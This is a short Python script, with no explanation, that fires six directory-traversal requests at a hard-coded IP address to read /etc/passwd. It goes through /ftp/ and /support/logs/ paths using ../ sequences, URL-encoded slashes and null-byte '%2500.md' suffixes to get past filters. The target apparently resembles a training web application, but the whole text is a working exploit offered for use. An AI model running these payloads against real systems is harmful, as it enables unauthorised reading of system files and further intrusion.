from urllib.request import urlopen, HTTPError
from contextlib import suppress
with suppress(HTTPError):print(urlopen("http://35.180.193.48:8080/ftp/../../../../../../../../../etc/passwd").read().decode())
with suppress(HTTPError):print(urlopen("http://35.180.193.48:8080/ftp/../../../../../../../../../etc/passwd%2500.md").read().decode())
with suppress(HTTPError):print(urlopen("http://35.180.193.48:8080/ftp/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%2500.md").read().decode())
with suppress(HTTPError):print(urlopen("http://35.180.193.48:8080/support/logs/../../../../../../../../../etc/passwd").read().decode())
with suppress(HTTPError):print(urlopen("http://35.180.193.48:8080/support/logs/../../../../../../../../../etc/passwd%2500.md").read().decode())
with suppress(HTTPError):print(urlopen("http://35.180.193.48:8080/support/logs/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%2500.md").read().decode())